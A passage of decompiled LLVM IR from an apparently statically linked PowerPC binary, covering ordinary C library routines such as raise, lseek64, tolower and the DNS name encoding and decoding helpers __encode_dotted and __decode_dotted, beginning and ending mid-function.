  uselistorder i32 10, { 12, 32, 33, 34, 35, 36, 37, 38, 23, 24, 20, 21, 22, 40, 39, 41, 42, 6, 44, 1, 27, 2, 28, 0, 7, 13, 47, 14, 25, 15, 26, 31, 8, 29, 30, 16, 9, 4, 5, 19, 43, 17, 3, 11, 10, 46, 18, 45 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 11, 12, 13, 14, 0, 1, 2, 3, 15, 16, 17, 18, 19, 20, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 6, { 28, 29, 30, 31, 32, 0, 1, 2, 20, 21, 22, 23, 10, 11, 34, 3, 24, 25, 6, 4, 26, 12, 27, 5, 13, 14, 15, 16, 17, 7, 8, 18, 9, 19, 33 }
  uselistorder i32* @global_var_100234d8, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 42, 43, 44, 0, 45, 46, 47, 13, 17, 48, 63, 8, 9, 10, 14, 49, 26, 27, 28, 29, 30, 31, 32, 33, 5, 6, 34, 35, 36, 69, 18, 40, 62, 19, 64, 65, 66, 67, 4, 20, 68, 1, 2, 7, 21, 3, 15, 52, 53, 54, 55, 70, 37, 38, 50, 51, 22, 23, 24, 25, 11, 12, 39, 16, 41, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 80, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 48, { 24, 10, 11, 12, 1, 13, 14, 5, 15, 16, 2, 17, 18, 19, 7, 20, 6, 21, 3, 0, 22, 23, 25, 8, 9, 4 }
  uselistorder i32 36, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 4, 5, 3, 1, 0, 2 }
  uselistorder i32 -48, { 3, 5, 4, 6, 1, 2, 0 }
  uselistorder i32 16, { 52, 11, 53, 54, 12, 55, 56, 0, 57, 58, 1, 59, 13, 60, 61, 26, 27, 62, 72, 73, 63, 64, 65, 66, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 83, 41, 4, 23, 21, 49, 22, 74, 75, 87, 88, 89, 90, 67, 68, 42, 43, 44, 45, 46, 47, 84, 85, 86, 69, 2, 70, 71, 14, 15, 24, 25, 6, 8, 7, 16, 48, 17, 20, 50, 5, 51, 18, 76, 77, 78, 79, 80, 19, 81, 3, 82, 9, 10 }
  uselistorder i32* @r27, { 44, 45, 46, 47, 48, 49, 1, 50, 51, 52, 53, 12, 13, 6, 14, 3, 2, 54, 55, 56, 57, 62, 0, 63, 64, 65, 66, 74, 75, 76, 77, 78, 79, 21, 22, 86, 4, 87, 7, 88, 93, 15, 16, 84, 85, 80, 81, 82, 83, 89, 90, 91, 23, 24, 67, 68, 69, 25, 26, 5, 27, 28, 29, 30, 8, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 9, 10, 11, 92, 70, 71, 72, 73, 42, 43, 58, 59, 60, 61, 17, 18, 19, 20 }
  uselistorder i32 32, { 57, 58, 59, 26, 60, 61, 27, 17, 18, 66, 67, 45, 28, 25, 46, 47, 14, 15, 37, 38, 36, 2, 3, 4, 16, 13, 64, 62, 63, 48, 49, 29, 50, 51, 52, 53, 54, 55, 56, 0, 68, 69, 65, 39, 40, 41, 1, 21, 42, 43, 44, 22, 30, 31, 6, 5, 8, 19, 7, 32, 10, 9, 33, 34, 12, 20, 11, 35, 23, 24 }
  uselistorder i32* @r10, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 4, { 4, 111, 132, 5, 6, 225, 223, 224, 145, 226, 227, 228, 127, 7, 229, 230, 231, 232, 233, 234, 235, 8, 236, 9, 10, 11, 133, 237, 239, 146, 240, 241, 242, 12, 13, 128, 181, 14, 15, 182, 183, 184, 185, 186, 187, 243, 147, 16, 17, 298, 299, 148, 18, 19, 116, 20, 21, 22, 23, 24, 25, 251, 252, 149, 26, 27, 2, 28, 0, 188, 3, 29, 1, 253, 150, 30, 246, 247, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 300, 201, 117, 314, 321, 31, 32, 33, 34, 35, 301, 302, 36, 303, 37, 304, 38, 39, 164, 40, 41, 165, 42, 219, 220, 221, 270, 271, 272, 43, 166, 44, 45, 46, 167, 47, 168, 169, 278, 280, 279, 276, 277, 170, 171, 172, 173, 281, 282, 283, 284, 285, 286, 287, 288, 289, 48, 174, 49, 254, 151, 255, 256, 118, 50, 51, 257, 52, 258, 259, 260, 261, 262, 263, 129, 53, 264, 130, 305, 306, 202, 54, 55, 56, 131, 57, 138, 297, 58, 59, 238, 60, 61, 315, 316, 317, 152, 318, 319, 320, 62, 307, 308, 309, 114, 115, 310, 311, 153, 312, 313, 63, 64, 65, 66, 67, 68, 69, 70, 203, 71, 204, 205, 135, 206, 207, 208, 209, 210, 72, 73, 211, 212, 136, 213, 214, 137, 215, 216, 218, 74, 75, 112, 113, 217, 248, 76, 249, 154, 250, 244, 245, 77, 78, 119, 79, 175, 80, 120, 81, 82, 83, 84, 176, 155, 177, 178, 179, 180, 139, 141, 140, 142, 85, 86, 156, 161, 162, 87, 134, 88, 222, 143, 265, 157, 266, 267, 268, 269, 121, 89, 122, 90, 273, 91, 158, 144, 159, 92, 123, 160, 93, 94, 95, 124, 274, 125, 96, 126, 97, 98, 275, 99, 100, 101, 290, 102, 291, 103, 292, 104, 293, 105, 294, 106, 295, 107, 296, 108, 109, 110, 163 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000f910, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f8e0, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000f8dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f898, { 1, 0 }
  uselistorder label %dec_label_pc_1000f890, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f86c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f82c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f7bc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000f80c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f778, { 1, 0 }
  uselistorder label %dec_label_pc_1000f75c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f6c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f658, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000f928 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268499264, i32* @lr, align 4
  %v0_1000f93c = call i32 @__libc_getpid()
  %v0_1000f944 = load i32, i32* @r29, align 4
  store i32 %v0_1000f928, i32* @lr, align 4
  %v2_1000f954 = call i32 @kill(i32 %v0_1000f93c, i32 %v0_1000f944)
  ret i32 %v2_1000f954

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000f958 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000f984 = call i32 @__asm_mfcr()
  %v1_1000f988 = and i32 %v0_1000f984, 268435456
  %v3_1000f988 = icmp eq i32 %v1_1000f988, 0
  store i32 %v0_1000f984, i32* %r31.global-to-local, align 4
  store i32 %v0_1000f984, i32* %r0.global-to-local, align 4
  br i1 %v3_1000f988, label %dec_label_pc_1000f9ac, label %dec_label_pc_1000f99c

dec_label_pc_1000f99c:                            ; preds = %entry
  %v0_1000f99c = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000f9a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000f9a4 = inttoptr i32 %v0_1000f99c to i32*
  store i32 %v0_1000f9a4, i32* %v2_1000f9a4, align 4
  %v0_1000f9b0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f9b0

dec_label_pc_1000f9ac:                            ; preds = %entry
  %v3_1000f994 = icmp eq i32 %v0_1000f984, 0
  br i1 %v3_1000f994, label %dec_label_pc_1000f9bc, label %dec_label_pc_1000f9b0

dec_label_pc_1000f9b0:                            ; preds = %dec_label_pc_1000f9ac, %dec_label_pc_1000f99c
  %v0_1000f9b0 = phi i32 [ %v0_1000f984, %dec_label_pc_1000f9ac ], [ %v0_1000f9b0.pre, %dec_label_pc_1000f99c ]
  %tmp = icmp slt i32 %v0_1000f9b0, 0
  %v1_1000f9b4 = zext i1 %tmp to i32
  %v2_1000f9b4 = ashr i32 %v0_1000f9b0, 31
  %v3_1000f9b4 = and i32 %v2_1000f9b4, -2
  %v4_1000f9b4 = or i32 %v3_1000f9b4, %v1_1000f9b4
  br label %dec_label_pc_1000f9c4

dec_label_pc_1000f9bc:                            ; preds = %dec_label_pc_1000f9ac
  %v3_1000f9bc = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000f9c4

dec_label_pc_1000f9c4:                            ; preds = %dec_label_pc_1000f9b0, %dec_label_pc_1000f9bc
  %v0_1000f9d4 = phi i32 [ %v4_1000f9b4, %dec_label_pc_1000f9b0 ], [ %v3_1000f9bc, %dec_label_pc_1000f9bc ]
  store i32 %v0_1000f958, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f9d4

; uselistorder directives
  uselistorder i32 %v0_1000f9b0, { 1, 0 }
  uselistorder i32 %v0_1000f984, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 8, 9, 10, 2, 20, 3, 5, 11, 12, 7, 1, 0, 13, 14, 15, 17, 18, 16, 19, 6, 21, 4 }
  uselistorder i32 31, { 10, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 11, 12, 1, 2, 42, 43, 13, 14, 15, 7, 8, 3, 4, 0, 6, 5, 16, 17, 18, 48, 49, 46, 47, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 41, 9, 44, 45 }
  uselistorder i32 ()* @__errno_location, { 50, 41, 67, 66, 65, 23, 40, 49, 48, 39, 18, 30, 47, 46, 31, 51, 14, 13, 12, 11, 10, 25, 9, 7, 61, 60, 53, 52, 64, 63, 62, 24, 59, 22, 36, 3, 2, 45, 44, 43, 0, 38, 37, 15, 42, 17, 16, 58, 33, 32, 57, 29, 6, 20, 28, 19, 56, 55, 35, 27, 26, 54, 8, 5, 4, 1, 68, 34, 21 }
  uselistorder i32 268435456, { 5, 7, 19, 11, 4, 22, 23, 24, 25, 26, 16, 21, 6, 20, 0, 9, 10, 1, 12, 28, 17, 13, 18, 2, 8, 14, 15, 3, 27, 29, 30, 31 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9c4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000f9d8 = add i32 %arg1, 128
  %v1_1000f9dc = mul i32 %arg1, 2
  %v2_1000f9e0 = icmp ugt i32 %v1_1000f9d8, 383
  %v0_1000f9e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000f9e0, i32 %v0_1000f9e4)
  %v3_1000f9ec = load i32, i32* bitcast (i32** @global_var_1002350c.316 to i32*), align 4
  %v2_1000f9f0 = add i32 %v1_1000f9dc, %v3_1000f9ec
  %v3_1000f9f0 = inttoptr i32 %v2_1000f9f0 to i16*
  %v4_1000f9f0 = load i16, i16* %v3_1000f9f0, align 2
  %v5_1000f9f0 = sext i16 %v4_1000f9f0 to i32
  ret i32 %v5_1000f9f0

; uselistorder directives
  uselistorder i32 128, { 17, 0, 1, 20, 21, 4, 5, 18, 3, 6, 7, 10, 11, 12, 13, 8, 14, 15, 16, 2, 9, 19 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000f9fc = load i32, i32* @lr, align 4
  store i32 %v0_1000f9fc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000fa08 = load i32, i32* @r4, align 4
  store i32 %v0_1000fa08, i32* @r29, align 4
  %v0_1000fa0c = load i32, i32* @r5, align 4
  store i32 %v0_1000fa0c, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000fa7813 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000fa7813, label %dec_label_pc_1000fa94, label %dec_label_pc_1000fa88

dec_label_pc_1000fa1c:                            ; preds = %dec_label_pc_1000fa88
  store i32 268499488, i32* @lr, align 4
  %v3_1000fa1c = call i32 @__GI_strchr(i32 %v0_1000fa8814, i32 46)
  store i32 %v3_1000fa1c, i32* @r30, align 4
  %v3_1000fa20 = icmp eq i32 %v3_1000fa1c, 0
  %v0_1000fa24 = load i32, i32* @r31, align 4
  store i32 %v0_1000fa24, i32* @r3, align 4
  %v2_1000fa28 = sub i32 %v3_1000fa1c, %v0_1000fa24
  store i32 %v2_1000fa28, i32* %r0.global-to-local, align 4
  br i1 %v3_1000fa20, label %dec_label_pc_1000fa30, label %dec_label_pc_1000fa38

dec_label_pc_1000fa30:                            ; preds = %dec_label_pc_1000fa1c
  %v0_1000fa30 = call i32 @__GI_strlen()
  store i32 %v0_1000fa30, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000fa30, 16777216
  %v1_1000fa34 = sdiv i32 %sext, 16777216
  store i32 %v1_1000fa34, i32* %r0.global-to-local, align 4
  %v0_1000fa48.pre = load i32, i32* @r31, align 4
  %v0_1000fa58.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fa38

dec_label_pc_1000fa38:                            ; preds = %dec_label_pc_1000fa1c, %dec_label_pc_1000fa30
  %v0_1000fa58 = phi i32 [ %v3_1000fa1c, %dec_label_pc_1000fa1c ], [ %v0_1000fa58.pre, %dec_label_pc_1000fa30 ]
  %v0_1000fa48 = phi i32 [ %v0_1000fa24, %dec_label_pc_1000fa1c ], [ %v0_1000fa48.pre, %dec_label_pc_1000fa30 ]
  %v0_1000fa64 = phi i32 [ %v2_1000fa28, %dec_label_pc_1000fa1c ], [ %v1_1000fa34, %dec_label_pc_1000fa30 ]
  %v0_1000fa3c = load i32, i32* @r28, align 4
  %v1_1000fa3c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000fa3c = sub i32 %v1_1000fa3c, %v0_1000fa3c
  %v1_1000fa40 = add i32 %v0_1000fa3c, 1
  store i32 %v1_1000fa40, i32* %r11.global-to-local, align 4
  %v1_1000fa44 = add i32 %v2_1000fa3c, -1
  store i32 %v0_1000fa48, i32* @r4, align 4
  %v0_1000fa4c = load i32, i32* @r29, align 4
  %v2_1000fa4c = add i32 %v0_1000fa4c, %v1_1000fa40
  store i32 %v2_1000fa4c, i32* @r3, align 4
  store i32 %v0_1000fa64, i32* @r5, align 4
  %v2_1000fa54 = icmp ult i32 %v0_1000fa64, %v1_1000fa44
  %v1_1000fa58 = add i32 %v0_1000fa58, 1
  store i32 %v1_1000fa58, i32* @r31, align 4
  %v3_1000fa38.not = icmp ne i32 %v0_1000fa64, 0
  %or.cond = and i1 %v2_1000fa54, %v3_1000fa38.not
  br i1 %or.cond, label %dec_label_pc_1000fa64, label %dec_label_pc_1000faac

dec_label_pc_1000fa64:                            ; preds = %dec_label_pc_1000fa38
  %v3_1000fa64 = trunc i32 %v0_1000fa64 to i8
  %v4_1000fa64 = add i32 %v0_1000fa4c, %v0_1000fa3c
  %v5_1000fa64 = inttoptr i32 %v4_1000fa64 to i8*
  store i8 %v3_1000fa64, i8* %v5_1000fa64, align 1
  %v0_1000fa68 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fa68 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000fa68 = add i32 %v1_1000fa68, %v0_1000fa68
  store i32 %v2_1000fa68, i32* @r28, align 4
  store i32 268499568, i32* @lr, align 4
  %v0_1000fa6c = call i32 @memcpy()
  store i32 %v0_1000fa6c, i32* %r3.global-to-local, align 4
  %v0_1000fa70 = load i32, i32* @r30, align 4
  %v3_1000fa70 = icmp eq i32 %v0_1000fa70, 0
  br i1 %v3_1000fa70, label %dec_label_pc_1000fa94, label %dec_label_pc_1000fa64.dec_label_pc_1000fa78_crit_edge

dec_label_pc_1000fa64.dec_label_pc_1000fa78_crit_edge: ; preds = %dec_label_pc_1000fa64
  %v0_1000fa78.pre = load i32, i32* @r31, align 4
  %v3_1000fa78 = icmp eq i32 %v0_1000fa78.pre, 0
  store i32 %v0_1000fa78.pre, i32* @r3, align 4
  br i1 %v3_1000fa78, label %dec_label_pc_1000fa94, label %dec_label_pc_1000fa88

dec_label_pc_1000fa88:                            ; preds = %entry, %dec_label_pc_1000fa64.dec_label_pc_1000fa78_crit_edge
  %v0_1000fa8814 = phi i32 [ %v0_1000fa78.pre, %dec_label_pc_1000fa64.dec_label_pc_1000fa78_crit_edge ], [ %tmp, %entry ]
  %v1_1000fa88 = inttoptr i32 %v0_1000fa8814 to i8*
  %v2_1000fa88 = load i8, i8* %v1_1000fa88, align 1
  %v3_1000fa88 = zext i8 %v2_1000fa88 to i32
  store i32 %v3_1000fa88, i32* %r0.global-to-local, align 4
  %v3_1000fa8c = icmp eq i8 %v2_1000fa88, 0
  br i1 %v3_1000fa8c, label %dec_label_pc_1000fa94, label %dec_label_pc_1000fa1c

dec_label_pc_1000fa94:                            ; preds = %dec_label_pc_1000fa64.dec_label_pc_1000fa78_crit_edge, %dec_label_pc_1000fa64, %dec_label_pc_1000fa88, %entry
  %v0_1000fa94 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000fa94, 1
  br i1 %tmp10, label %dec_label_pc_1000faac, label %dec_label_pc_1000fa9c

dec_label_pc_1000fa9c:                            ; preds = %dec_label_pc_1000fa94
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000faa0 = load i32, i32* @r28, align 4
  %v1_1000faa0 = add i32 %v0_1000faa0, 1
  store i32 %v1_1000faa0, i32* %r3.global-to-local, align 4
  %v1_1000faa4 = load i32, i32* @r29, align 4
  %v4_1000faa4 = add i32 %v1_1000faa4, %v0_1000faa0
  %v5_1000faa4 = inttoptr i32 %v4_1000faa4 to i8*
  store i8 0, i8* %v5_1000faa4, align 1
  %v0_1000fac0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fab0

dec_label_pc_1000faac:                            ; preds = %dec_label_pc_1000fa38, %dec_label_pc_1000fa94
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fab0

dec_label_pc_1000fab0:                            ; preds = %dec_label_pc_1000fa9c, %dec_label_pc_1000faac
  %v0_1000fac0 = phi i32 [ %v0_1000fac0.pre, %dec_label_pc_1000fa9c ], [ -1, %dec_label_pc_1000faac ]
  store i32 %v0_1000f9fc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000fac0

; uselistorder directives
  uselistorder i32 %v0_1000fa8814, { 1, 0 }
  uselistorder i32 %v0_1000fa78.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000fa64, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000fa34, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 8, 22, 21, 7, 4, 12, 11, 10, 23, 20, 19, 18, 16, 17, 15, 14, 13, 9, 6, 0, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 3, 2, 1, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 46, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000fab0, { 1, 0 }
  uselistorder label %dec_label_pc_1000faac, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa94, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000fa88, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa38, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000fac8 = call i32 @__asm_mfcr()
  store i32 %v0_1000fac8, i32* @r26, align 4
  %v3_1000fad4 = icmp eq i32 %v0_1000fac8, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000fae4 = load i32, i32* @r6, align 4
  store i32 %v0_1000fae4, i32* @r24, align 4
  br i1 %v3_1000fad4, label %dec_label_pc_1000fb9c, label %dec_label_pc_1000faec

dec_label_pc_1000faec:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000fb7814 = load i32, i32* @r4, align 4
  %v2_1000fb7815 = add i32 %v1_1000fb7814, %v0_1000fac8
  %v3_1000fb7816 = inttoptr i32 %v2_1000fb7815 to i8*
  %v4_1000fb7817 = load i8, i8* %v3_1000fb7816, align 1
  %v5_1000fb7818 = zext i8 %v4_1000fb7817 to i32
  store i32 %v5_1000fb7818, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1000fb8020 = icmp eq i8 %v4_1000fb7817, 0
  br i1 %v3_1000fb8020, label %dec_label_pc_1000fb8c, label %dec_label_pc_1000fafc

dec_label_pc_1000fafc:                            ; preds = %dec_label_pc_1000faec, %dec_label_pc_1000fb74
  %v3_1000fb7c22 = phi i1 [ %v3_1000fb7c, %dec_label_pc_1000fb74 ], [ false, %dec_label_pc_1000faec ]
  %v5_1000fb7821 = phi i32 [ %v5_1000fb78, %dec_label_pc_1000fb74 ], [ %v5_1000fb7818, %dec_label_pc_1000faec ]
  br i1 %v3_1000fb7c22, label %dec_label_pc_1000fb04, label %dec_label_pc_1000fb00

dec_label_pc_1000fb00:                            ; preds = %dec_label_pc_1000fafc
  %v0_1000fb00 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000fb00 = add i32 %v0_1000fb00, 1
  store i32 %v1_1000fb00, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fb04

dec_label_pc_1000fb04:                            ; preds = %dec_label_pc_1000fafc, %dec_label_pc_1000fb00
  %v1_1000fb04 = call i32 @__asm_rlwinm(i32 %v5_1000fb7821, i32 0, i32 24, i32 25)
  %v0_1000fb08 = load i32, i32* @r4, align 4
  %v1_1000fb08 = add i32 %v0_1000fb08, 1
  store i32 %v1_1000fb08, i32* @r30, align 4
  %v3_1000fb0c = icmp eq i32 %v1_1000fb04, 192
  br i1 %v3_1000fb0c, label %dec_label_pc_1000fb14, label %dec_label_pc_1000fb34

dec_label_pc_1000fb14:                            ; preds = %dec_label_pc_1000fb04
  %v0_1000fb14 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000fb14, label %dec_label_pc_1000fb1c, label %dec_label_pc_1000fb18

dec_label_pc_1000fb18:                            ; preds = %dec_label_pc_1000fb14
  %v0_1000fb18 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000fb18 = add i32 %v0_1000fb18, 1
  store i32 %v1_1000fb18, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fb1c

dec_label_pc_1000fb1c:                            ; preds = %dec_label_pc_1000fb14, %dec_label_pc_1000fb18
  %v0_1000fb1c = load i32, i32* @r26, align 4
  %v2_1000fb1c = add i32 %v0_1000fb1c, %v1_1000fb08
  %v3_1000fb1c = inttoptr i32 %v2_1000fb1c to i8*
  %v4_1000fb1c = load i8, i8* %v3_1000fb1c, align 1
  %v5_1000fb1c = zext i8 %v4_1000fb1c to i32
  %v1_1000fb20 = call i32 @__asm_rlwinm(i32 %v5_1000fb7821, i32 8, i32 18, i32 23)
  %v0_1000fb24 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000fb24, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000fb2c = or i32 %v5_1000fb1c, %v1_1000fb20
  store i32 %v2_1000fb2c, i32* @r4, align 4
  br label %dec_label_pc_1000fb74

dec_label_pc_1000fb34:                            ; preds = %dec_label_pc_1000fb04
  %v0_1000fb34 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000fb34 = add i32 %v0_1000fb34, %v5_1000fb7821
  store i32 %v2_1000fb34, i32* @r29, align 4
  %v1_1000fb38 = add i32 %v2_1000fb34, 1
  store i32 %v1_1000fb38, i32* @r28, align 4
  %v1_1000fb3c = load i32, i32* @r24, align 4
  %v2_1000fb3c = icmp ult i32 %v1_1000fb38, %v1_1000fb3c
  br i1 %v2_1000fb3c, label %dec_label_pc_1000fb44, label %dec_label_pc_1000fb9c

dec_label_pc_1000fb44:                            ; preds = %dec_label_pc_1000fb34
  %v0_1000fb44 = load i32, i32* @r26, align 4
  %v2_1000fb44 = add i32 %v0_1000fb44, %v1_1000fb08
  store i32 %v2_1000fb44, i32* @r4, align 4
  %v0_1000fb48 = load i32, i32* @r25, align 4
  %v2_1000fb48 = add i32 %v0_1000fb48, %v0_1000fb34
  store i32 %v2_1000fb48, i32* @r3, align 4
  store i32 %v5_1000fb7821, i32* @r5, align 4
  store i32 268499796, i32* @lr, align 4
  %v0_1000fb50 = call i32 @memcpy()
  %v0_1000fb54 = load i32, i32* @r30, align 4
  %v2_1000fb54 = add i32 %v0_1000fb54, %v5_1000fb7821
  store i32 %v2_1000fb54, i32* @r4, align 4
  %v0_1000fb58 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000fb58, label %dec_label_pc_1000fb60, label %dec_label_pc_1000fb5c

dec_label_pc_1000fb5c:                            ; preds = %dec_label_pc_1000fb44
  %v0_1000fb5c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000fb5c = add i32 %v0_1000fb5c, %v5_1000fb7821
  store i32 %v2_1000fb5c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fb60

dec_label_pc_1000fb60:                            ; preds = %dec_label_pc_1000fb44, %dec_label_pc_1000fb5c
  %v0_1000fb60 = load i32, i32* @r26, align 4
  %v2_1000fb60 = add i32 %v0_1000fb60, %v2_1000fb54
  %v3_1000fb60 = inttoptr i32 %v2_1000fb60 to i8*
  %v4_1000fb60 = load i8, i8* %v3_1000fb60, align 1
  %v3_1000fb64 = icmp eq i8 %v4_1000fb60, 0
  br i1 %v3_1000fb64, label %dec_label_pc_1000fb70, label %dec_label_pc_1000fb6c

dec_label_pc_1000fb6c:                            ; preds = %dec_label_pc_1000fb60
  br label %dec_label_pc_1000fb70

dec_label_pc_1000fb70:                            ; preds = %dec_label_pc_1000fb60, %dec_label_pc_1000fb6c
  %v0_1000fb70.off0 = phi i8 [ 0, %dec_label_pc_1000fb60 ], [ 46, %dec_label_pc_1000fb6c ]
  %v1_1000fb70 = load i32, i32* @r25, align 4
  %v2_1000fb70 = load i32, i32* @r29, align 4
  %v4_1000fb70 = add i32 %v2_1000fb70, %v1_1000fb70
  %v5_1000fb70 = inttoptr i32 %v4_1000fb70 to i8*
  store i8 %v0_1000fb70.off0, i8* %v5_1000fb70, align 1
  %v0_1000fb74.pre = load i32, i32* @r28, align 4
  %v0_1000fb7c.pre.pre = load i32, i32* @r23, align 4
  %v1_1000fb78.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000fb74

dec_label_pc_1000fb74:                            ; preds = %dec_label_pc_1000fb1c, %dec_label_pc_1000fb70
  %v1_1000fb78 = phi i32 [ %v2_1000fb2c, %dec_label_pc_1000fb1c ], [ %v1_1000fb78.pre, %dec_label_pc_1000fb70 ]
  %v0_1000fb7c.pre = phi i32 [ 0, %dec_label_pc_1000fb1c ], [ %v0_1000fb7c.pre.pre, %dec_label_pc_1000fb70 ]
  %v0_1000fb74 = phi i32 [ %v0_1000fb24, %dec_label_pc_1000fb1c ], [ %v0_1000fb74.pre, %dec_label_pc_1000fb70 ]
  %v0_1000fb78.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000fb74, i32* %r11.global-to-local, align 4
  %v2_1000fb78 = add i32 %v1_1000fb78, %v0_1000fb78.pre
  %v3_1000fb78 = inttoptr i32 %v2_1000fb78 to i8*
  %v4_1000fb78 = load i8, i8* %v3_1000fb78, align 1
  %v5_1000fb78 = zext i8 %v4_1000fb78 to i32
  store i32 %v5_1000fb78, i32* @r31, align 4
  %v3_1000fb7c = icmp eq i32 %v0_1000fb7c.pre, 0
  store i1 %v3_1000fb7c, i1* %cr4_eq.global-to-local, align 1
  %v3_1000fb80 = icmp eq i8 %v4_1000fb78, 0
  br i1 %v3_1000fb80, label %dec_label_pc_1000fb88, label %dec_label_pc_1000fafc

dec_label_pc_1000fb88:                            ; preds = %dec_label_pc_1000fb74
  %v0_1000fb90.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000fb7c, label %dec_label_pc_1000fb9c, label %dec_label_pc_1000fb8c

dec_label_pc_1000fb8c:                            ; preds = %dec_label_pc_1000faec, %dec_label_pc_1000fb88
  %v0_1000fb90.pre26 = phi i32 [ %v0_1000fb90.pre.pre, %dec_label_pc_1000fb88 ], [ 0, %dec_label_pc_1000faec ]
  %v1_1000fb8c = add i32 %v0_1000fb90.pre26, 1
